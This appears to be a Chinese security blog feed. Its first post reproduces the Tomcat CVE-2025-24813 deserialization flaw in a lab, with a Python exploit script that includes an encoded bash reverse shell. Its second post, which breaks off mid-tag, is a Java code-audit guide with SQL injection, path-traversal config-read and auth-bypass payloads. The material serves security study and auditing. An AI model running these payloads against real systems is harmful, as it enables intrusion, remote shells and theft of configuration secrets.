    <content type="html"><![CDATA[<h1 id="CVE-2025-24813-RCE复现"><a href="#CVE-2025-24813-RCE复现" class="headerlink" title="CVE-2025-24813 RCE复现"></a>CVE-2025-24813 RCE复现</h1><p>参考文章：</p><p><a href="https://blog.csdn.net/Dalock/article/details/146425886">Tomcat RCE（CVE-2025-24813）复现_cve-2025-24813 复现-CSDN博客</a></p><p><a href="https://www.freebuf.com/vuls/425025.html">CVE-2025-24813 RCE复现 - FreeBuf网络安全行业门户</a></p><p><a href="https://blog.meteorkai.top/2025/03/21/CVE-2025-24813-Tomcat-RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%83%A8%E5%88%86DefaultServlet-doPut">CVE-2025-24813 Tomcat RCE 分析复现 (meteorkai.top)</a></p><h4 id="漏洞影响范围"><a href="#漏洞影响范围" class="headerlink" title="漏洞影响范围"></a>漏洞影响范围</h4><h4 id="漏洞影响范围-1"><a href="#漏洞影响范围-1" class="headerlink" title="漏洞影响范围"></a>漏洞影响范围</h4><ul><li>9.0.0.M1 &lt;&#x3D; Apache Tomcat &lt;&#x3D; 9.0.98</li><li>10.1.0-M1 &lt;&#x3D; Apache Tomcat &lt;&#x3D; 10.1.34</li><li>11.0.0-M1 &lt;&#x3D; Apache Tomcat &lt;&#x3D; 11.0.2</li></ul><h4 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h4><ol><li>DefaultServlet 写入功能启用：需要在<code>web.xml</code>中配置<code>readonly=false</code></li><li>PartialPUT请求支持：tomcat中默认支持分块上传</li><li>文件会话持久化启用：在 context.xml 中配置 PersistentManager 和 FileStore</li><li>存在反序列化的利用链：需要包含漏洞的库（这里使用commons-collections-3.2.1.jar）</li></ol><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><ol><li>Tomcat中文件会话持久化技术，<code>Content-Range</code>在Tomcat的HTTP PUT请求中主要实现用于大文件的分块传输，在文件上传未完成的情况下，会被临时储存在Tomcat的工作目录下<code>CATALINA_BASE/work/Catalina/localhost/ROOT</code>中</li><li>漏洞核心在于：对不完整的PUT请求上传的文件名处理机制：文件路径中的分隔符<code>/</code>会被转化为<code>.</code>。例如：对于PUT请求的路径<code>/evil/session</code>会被解析为<code>.evil.session</code>中</li><li>Tomcat的File会话存储默认路径同样位于：<code>CATALINA_BASE/work/Catalina/localhost/ROOT</code>，在Cookie中带有<code>JSESSIONID</code>字段时，Tomcat会将该字段中的<code>.id</code>与<code>.session</code>拼接，并从会话存储路径中寻找文件名为<code>.id.session</code>的文件，对该文件的内容进行反序列化操作，从而触发攻击链</li></ol><h4 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h4><ol><li>当存在反序列化利用链时，上传包含恶意的序列化数据文件（临时存储在<code>CATALINA_BASE/work/Catalina/localhost/ROOT</code>）</li><li>通过设置<code>JSESSIONID=.xxxx</code>来触发漏洞（位置也在<code>CATALINA_BASE/work/Catalina/localhost/ROOT</code>）</li></ol><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><ul><li><p>新建一个对应的tomcat项目</p></li><li><p>启用DefaultServlet写入</p><p>在<code>conf/web.xml</code>中，将DefaultServlet的readonly配置为false（默认true），启用写入功能：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>readonly<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>启用文件会话持久化并使用默认的会话存储位置</p><p>在<code>conf/context.xml</code>中，添加如下配置，开启File文件会话存储：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">Manager</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;org.apache.catalina.session.PersistentManager&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Store</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;org.apache.catalina.session.FileStore&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">Manager</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ul><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><ul><li><p>尝试过使用burpsuit和yakit发送数据包，发现都不成功，也有发送的文件文件名被重写保存在&#x2F;tomcat文件下，尝试后发现只有使用python写脚本发包能够正常保存.session文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> requests<br> <br>target = <span class="hljs-string">&quot;http://172.31.80.1:8080/poc/session&quot;</span><br>target_poc = <span class="hljs-string">&quot;http://172.31.80.1:8080/&quot;</span><br> <br><span class="hljs-comment"># ysoserial.jar 文件路径</span><br>fp = <span class="hljs-string">&#x27;D:\java漏洞利用\ysoserial-all.jar&#x27;</span><br> <br>gadget = <span class="hljs-string">&quot;CommonsCollections5&quot;</span><br>linux_rshell = <span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjguMTMyLzc3NzcgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br>linux_cmd = <span class="hljs-string">&quot;touch /tmp/success&quot;</span><br>win_cmd = <span class="hljs-string">&quot;calc&quot;</span><br> <br>command = win_cmd<br> <br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(fp):<br>    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;jar file not found&#x27;</span>)<br>popen = subprocess.Popen([<span class="hljs-string">&#x27;java&#x27;</span>,<span class="hljs-string">&#x27;-jar&#x27;</span>,fp,gadget,command],<br>                         stdout=subprocess.PIPE)<br> <br>file_body = popen.stdout.read()<br> <br>headers = &#123;<br>    <span class="hljs-string">&#x27;Content-Length&#x27;</span>: <span class="hljs-string">&#x27;3000&#x27;</span>,<br>    <span class="hljs-string">&#x27;Content-Range&#x27;</span>: <span class="hljs-string">&#x27;bytes 0-3000/3200&#x27;</span><br>&#125;<br>response = requests.put(target, data=file_body, headers=headers, timeout=<span class="hljs-number">10</span>)<br><span class="hljs-comment"># print(response.text)</span><br> <br><span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Press Enter to continue...&quot;</span>)<br> <br>response = requests.get(target_poc, cookies=&#123;<span class="hljs-string">&#x27;JSESSIONID&#x27;</span>:<span class="hljs-string">&#x27;.poc&#x27;</span>&#125;, timeout=<span class="hljs-number">10</span>)<br></code></pre></td></tr></table></figure></li><li><p>在Catalina&#x2F;localhost&#x2F;ROOT&#x2F;org&#x2F;apache&#x2F;jsp路径下，可以看到成功上传了带有恶意序列化数据的文件</p><p><img src="/img/CVE02.png"></p><p>但是并未弹出计算器，显示服务器内部出错</p></li><li><p>分析后发现是导入tomcat的jar包时出现一些问题，jar包未导入库中，原因未知</p></li></ul><h4 id="源代码分析"><a href="#源代码分析" class="headerlink" title="源代码分析"></a>源代码分析</h4><ul><li><p>jar包导入时出现了问题，没有继续调试了，只看了文章</p></li><li><p>临时文件创建源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">doPut(DefaultServlet)-&gt;executePartialPut<br>条件：<br> 1.readOnly=<span class="hljs-literal">false</span><br> 2.Content-Range合法<br>executePartialPut方法核心控制：<br>将一个path中的/替换为.后当作文件名，然后写入到工作目录下的ROOT路径下的.poc.session中<br>走到<span class="hljs-built_in">return</span> contentFile时，的恶意文件已经写好<br></code></pre></td></tr></table></figure></li><li><p>反序列化漏洞触发过程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">触发点：load方法(其中的特殊函数:ObjectInputStream 反序列化漏洞的特殊函数)<br>-&gt;file方法(接受Cookie中的<span class="hljs-built_in">id</span>，然后与.session拼接起来，然后将文件名为.poc.session的File类型的属性返回回去)<br>-&gt;FileInpuStream(将文件内容以字节流的方式读出)<br>-&gt;readObject(进行反序列化，触发构造的攻击链)<br></code></pre></td></tr></table></figure></li></ul><h4 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h4><ul><li><p>从磁盘导入jdk时一直显示不是jdk有效路径</p><p>解决：更改jdk安装路径时必须将新文件夹命名为jdk1.8.0_版本，否则IDEA无法识别</p></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>CVE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java代码审计</title>
    <link href="/2025/05/27/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2025/05/27/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h2 id="Java代码审计"><a href="#Java代码审计" class="headerlink" title="Java代码审计"></a>Java代码审计</h2><ul><li>读懂一段代码：从下到上追踪，找到变量的传递与函数之间的关系，理清代码即可大致读懂</li><li>分析变量组成：打印出每个过程参数的值逐个分析(调试)</li></ul><h3 id="通用步骤"><a href="#通用步骤" class="headerlink" title="通用步骤"></a>通用步骤</h3><ul><li>寻找漏洞触发点</li><li>构造payload尝试利用漏洞</li></ul><h3 id="checklist"><a href="#checklist" class="headerlink" title="checklist"></a>checklist</h3><p><a href="https://mp.weixin.qq.com/s/Y90mGgCqzjj0T1NX9E5wDw">Java代码审计checklist（上） (qq.com)</a></p><p><a href="https://mp.weixin.qq.com/s/COXCjMItvrcOCNcqEfbmDg">JAVA攻防基础之代码审计 (qq.com)</a></p><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><ul><li><p>三个模式</p><p>JDBC，Mybatis，Hibernate</p><p>JDBC与Mybatis：<a href="https://blog.csdn.net/keyboard_/article/details/127477755">持久层技术对比：Mybatis 与 JDBC 的区别到底在哪里_jdbc和mybatis的应用场景-CSDN博客</a></p></li><li><p>出现注入</p><ul><li>原生JDBC是否存在直接拼接sql语句(使用+，或者使用StringBuilder.append())，未经过预编译</li><li>Mybatis使用${}</li><li>Hibernate, JPA是默认经过预编译的，但是开发自己编写的sql语句，需要检查</li></ul></li><li><p>参考文章：<a href="https://mp.weixin.qq.com/s/9t3t6qxosGsKiXMIRtMoPw">JAVA常用框架SQL注入审计 (qq.com)</a></p></li><li><p>判断模式</p><ul><li>看项目中说明使用的技术框架</li><li>看引用中加载的那些技术框架</li><li>看配置源码中相关的配置文件</li></ul></li><li><p>入口确定</p><ol><li>是否使用预编译技术，预编译是否完整</li><li>定位sql语句上下文，查看是否有参数直接拼接，是否对模糊查询关键字的过滤</li><li>Mybatis框架则搜索${}，四种情况无法预编译：like模糊查询，order by排序，范围查询in，动态列名，表名，只能拼接，所以还是需要手工防注入<br>注：like和in语句直接使用#{}会报错，改为${}恢复正常但是无法预编译</li></ol></li></ul><p>​正确写法：<br>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs java">  mysql:<br>    select * from users where username like <span class="hljs-title function_">concat</span><span class="hljs-params">(<span class="hljs-string">&#x27;%&#x27;</span>,#&#123;username&#125;,<span class="hljs-string">&#x27;%&#x27;</span>)</span><br>  oracle:<br>    select * from users where username like <span class="hljs-string">&#x27;%&#x27;</span>||#&#123;username&#125;||<span class="hljs-string">&#x27;%&#x27;</span><br>  sqlserver:<br>    select * from users where username like <span class="hljs-string">&#x27;%&#x27;</span>+#&#123;username&#125;+<span class="hljs-string">&#x27;%&#x27;</span><br>  ```  <br><br><br>#### 步骤<br><br>- 找模式<br>- 搜关键字<br>- 追踪确定可控变量<br>- 确定路由<br>- 构造payload测试<br><br>#### jfinal_cms案例<br><br>- 查看配置文件发现是JDBC驱动<br><br>- 全局搜索append()关键字，寻找与sql相关的语句<br><br>  ![图片](/img/java审计/java审计<span class="hljs-number">01.</span>png)<br><br>  发现新定义了一个sql语句，并且使用了append()函数拼接<br><br>- 判断orderBy变量是否可控，有无过滤<br><br>  - 追踪getBaseForm()类与getOrderBy()方法发现<br><br>    ![](/img/java审计/java审计<span class="hljs-number">02.</span>png)<br><br>- 找到对应路由后访问抓包，发现数据包中有form.orderColumn参数，添加*号放到sqlmap中测试payload<br><br>#### oa_system-master案例<br><br>- 查看文字说明发现此oa系统使用的是Mybatis框架<br><br>- 指定文件掩码为 *.xml，全局搜索$&#123;<br><br>  ![](/img/java审计/java审计<span class="hljs-number">03.</span>png)<br><br>  跳转查看baseKey参数，全局搜索selece的id值sortMyNotice<br><br>- 寻找baseKey的实现，确定路由为(/informlistpaging)<br><br>  ![](/img/java审计/java审计<span class="hljs-number">04.</span>png)<br><br>- 找到路由后访问抓取数据包，使用sqlmap测试payload<br><br>#### RuoYi案例<br><br>- 在源码简介处发现使用的Mybatis框架<br><br>- 搜索关键字$&#123;<br><br>- 找到可能存在不安全写法的地方(筛选出可能的注入点，可执行sql语句)<br><br>  ![](/img/java审计/java审计<span class="hljs-number">05.</span>png)<br><br>  追踪updateDeptStatus的用法<br><br>- 全局搜索updateDeptStatus关键字逐个查找用法(寻找路由关系)<br><br>- 直接搜索updateDeptStatus关键字发现此关键字出现在service层中<br><br>  - 基于springboot中，执行sql语句的三个调用<br>    - 业务层调用Dao层<br>    - controller调用service层间接调用Dao层<br>    - controller直接调用Dao层<br>  - 路由关系一般写在controller中<br><br>- 选中updateDeptStatus关键字，点击查找用法，发现updateDept调用了此方法，继续追踪此方法，找到SysDeptController文件中有调用updateDept方法，<br><br>  顺利找到路由关系<br><br>  $&#123;-&gt;updateDeptStatus-&gt;updateParentDeptStatus-&gt;updateDept-&gt;/system/dept/edit<br><br>- 测试payload<br><br>  - 直接访问url地址发现报错<br><br>  - 根据中文注释找到功能点抓取数据包，成功找到/system/dept/edit路由的数据<br><br>  - 发现数据包中没有注入参数值，尝试手动添加<br><br>  - 使用sqlmap无法成功注入，使用手工注入<br><br>  - ```java<br>    DeptName=<span class="hljs-number">1</span>&amp;DeptId=<span class="hljs-number">100</span>&amp;ParentId=<span class="hljs-number">12</span>&amp;&amp;status=<span class="hljs-number">0</span>&amp;OrderNum=<span class="hljs-number">1</span>&amp;ancestors=<span class="hljs-number">0</span>)or(extractvalue(<span class="hljs-number">1</span>,concat((select <span class="hljs-title function_">user</span><span class="hljs-params">()</span>))));#<br></code></pre></td></tr></table></figure></p><ul><li>使用括号绕过空格过滤</li></ul><h3 id="文件安全"><a href="#文件安全" class="headerlink" title="文件安全"></a>文件安全</h3><p><a href="https://blog.csdn.net/god_zzZ/article/details/108104523">Java代码审计：文件篇&#x2F;文件上传&#x2F;文件读取&#x2F;目录遍历_潜在路径遍历(文件读取) 打开文件以读取其内容。文件名来自输入参数。如果将未过-CSDN博客</a></p><ul><li><p>关键字查询</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A106.png"></p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A107.png"></p></li></ul><h4 id="Inxedu案例-前台文件上传"><a href="#Inxedu案例-前台文件上传" class="headerlink" title="Inxedu案例(前台文件上传)"></a>Inxedu案例(前台文件上传)</h4><ul><li><p>搭建网站后直接寻找功能点，发现有文件上传</p></li><li><p>尝试上传文件找到路由</p></li><li><p>此网站源码将文件安全代码封装在jar包中，&#x2F;UploadController.class，需要通读目录，理清结构才能找到</p></li><li><p>根据上传文件时找到的路由，确定控制代码</p></li><li><p>发现是黑名单过滤，只过滤jsp文件</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A108.png"></p></li><li><p>使用工具生成jspx文件，修改前端白名单过滤代码，成功上传</p></li></ul><h4 id="Tmall案例"><a href="#Tmall案例" class="headerlink" title="Tmall案例"></a>Tmall案例</h4><h5 id="后台文件上传"><a href="#后台文件上传" class="headerlink" title="后台文件上传"></a>后台文件上传</h5><ul><li><p>搜索文件安全相关关键字</p></li><li><p>搜索new File，找到文件上传相关代码</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A109.png"></p><p>文件上传过滤一般关注后缀，所以在此段代码中应该关注文件名后缀是如何获取的</p><p>发现这段代码是直接获取了原文件后缀后并没有过滤，而是直接上传了</p></li><li><p>开始测试，发现有前端验证，抓包后更改后缀为jsp可以正常上传</p></li></ul><h5 id="过滤器鉴权"><a href="#过滤器鉴权" class="headerlink" title="过滤器鉴权"></a>过滤器鉴权</h5><ul><li><p>找到过滤器核心代码AdminPermissionFilter类</p></li><li><p>找到核心控制方法doFilter</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A110.png"></p><p>发现鉴权存在了漏洞，容易越权</p></li><li><p>进行测试</p><ul><li>在数据包url中加上 &#x2F;admin&#x2F;login&#x2F;..&#x2F;..&#x2F;</li><li>成功绕过鉴权</li></ul></li></ul><h4 id="RuoYi-4-5-0-文件下载"><a href="#RuoYi-4-5-0-文件下载" class="headerlink" title="RuoYi-4.5.0(文件下载)"></a>RuoYi-4.5.0(文件下载)</h4><ul><li><p>搜索关键字new FileInputStream</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A111.png"></p><p>找到这段相关代码控制字节输出，但是发现这个类中没有路由关系，不能直接触发此漏洞</p></li><li><p>尝试查找是否有用过writeBytes方法</p></li><li><p>查找用法后发现，CommonController类中fileDownload方法和resourceDownload方法调用了此方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/common/download/resource&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">resourceDownload</span><span class="hljs-params">(String resource, HttpServletRequest request, HttpServletResponse response)</span><br>            <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br>        <span class="hljs-comment">// 本地资源路径</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">localPath</span> <span class="hljs-operator">=</span> Global.getProfile();<br>        <span class="hljs-comment">// 数据库资源地址</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">downloadPath</span> <span class="hljs-operator">=</span> localPath + StringUtils.substringAfter(resource, Constants.RESOURCE_PREFIX);<br>        <span class="hljs-comment">// 下载名称</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">downloadName</span> <span class="hljs-operator">=</span> StringUtils.substringAfterLast(downloadPath, <span class="hljs-string">&quot;/&quot;</span>);<br><br>        response.setContentType(MediaType.APPLICATION_OCTET_STREAM_VALUE);<br>        FileUtils.setAttachmentResponseHeader(response, downloadName);<br><br>        FileUtils.writeBytes(downloadPath, response.getOutputStream());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>打印出localPath与downloadPath的值查看resource参数是如何构成的</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A112.png"></p><p>代码释义</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 资源文件下载接口</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> resource 资源路径参数（包含资源标识符）</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> request HTTP请求对象</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> response HTTP响应对象</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> Exception 可能抛出的异常</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@GetMapping(&quot;/common/download/resource&quot;)</span>  <span class="hljs-comment">// 定义GET请求映射路径</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">resourceDownload</span><span class="hljs-params">(String resource, HttpServletRequest request, HttpServletResponse response)</span><br>        <span class="hljs-keyword">throws</span> Exception<br>&#123;<br>    <span class="hljs-comment">// 获取本地资源存储的基础路径（例如：D:/upload/）</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">localPath</span> <span class="hljs-operator">=</span> Global.getProfile();<br>    <br>    <span class="hljs-comment">// 从resource参数中截取资源相对路径，并拼接成完整物理路径</span><br>    <span class="hljs-comment">// 例如：resource=&quot;profile/xxx.jpg&quot; → 截取后变成&quot;/xxx.jpg&quot; → 最终路径&quot;D:/upload/xxx.jpg&quot;</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">downloadPath</span> <span class="hljs-operator">=</span> localPath + StringUtils.substringAfter(resource, Constants.RESOURCE_PREFIX);<br>    <br>    <span class="hljs-comment">// 从完整路径中提取文件名（最后一个/后的内容）</span><br>    <span class="hljs-comment">// 例如：&quot;D:/upload/xxx.jpg&quot; → &quot;xxx.jpg&quot;</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">downloadName</span> <span class="hljs-operator">=</span> StringUtils.substringAfterLast(downloadPath, <span class="hljs-string">&quot;/&quot;</span>);<br><br>    <span class="hljs-comment">// 设置响应内容类型为二进制流（强制浏览器下载而不是直接打开）</span><br>    response.setContentType(MediaType.APPLICATION_OCTET_STREAM_VALUE);<br>    <br>    <span class="hljs-comment">// 设置响应头，指定下载文件名（解决中文乱码等问题）</span><br>    FileUtils.setAttachmentResponseHeader(response, downloadName);<br><br>    <span class="hljs-comment">// 将文件内容写入响应输出流（实现下载）</span><br>    FileUtils.writeBytes(downloadPath, response.getOutputStream());<br>&#125;<br></code></pre></td></tr></table></figure><p>localPath是开发人员自己设置的源代码路径，发现没有过滤..&#x2F;</p></li><li><p>构造payload(实战中要猜测文件所处的位置，文件夹名称)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://localhost:8088//common/download/resource?resource=/profile/../RuoYi-v4.5.0/ruoyi-admin/src/main/resources/application-druid.yml<br></code></pre></td></tr></table></figure></li><li><p>在v4.6.0版本中的同样位置找到新版本修复了此漏洞，过滤了..&#x2F;，多了检测规则</p></li></ul><h4 id="oa-system-master案例-文件读取"><a href="#oa-system-master案例-文件读取" class="headerlink" title="oa-system-master案例(文件读取)"></a>oa-system-master案例(文件读取)</h4><ul><li><p>搜索关键字FileInputStream</p><p>找到一段相关代码，开始审计</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;//**&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> /(Model model, HttpServletResponse response, <span class="hljs-meta">@SessionAttribute(&quot;userId&quot;)</span> Long userId, HttpServletRequest request)<br><span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-type">String</span> <span class="hljs-variable">projectPath</span> <span class="hljs-operator">=</span> ClassUtils.getDefaultClassLoader().getResource(<span class="hljs-string">&quot;&quot;</span>).getPath();<br>System.out.println(projectPath);<br><span class="hljs-type">String</span> <span class="hljs-variable">startpath</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(URLDecoder.decode(request.getRequestURI(), <span class="hljs-string">&quot;utf-8&quot;</span>));<br><br><span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> startpath.replace(<span class="hljs-string">&quot;//&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br><br><span class="hljs-type">File</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(rootpath, path);<br><br><span class="hljs-type">ServletOutputStream</span> <span class="hljs-variable">sos</span> <span class="hljs-operator">=</span> response.getOutputStream();<br><span class="hljs-type">FileInputStream</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(f.getPath());<br><span class="hljs-type">byte</span>[] data = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[(<span class="hljs-type">int</span>) f.length()];<br>IOUtils.readFully(input, data);<br><span class="hljs-comment">// 将文件流输出到浏览器</span><br>IOUtils.write(data, sos);<br>input.close();<br>sos.close();<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>读懂一段代码：从下到上追踪，找到变量的传递与函数之间的关系，理清代码即可大致读懂</p></li><li><p>打印出每个过程参数的值逐个分析</p><p><img 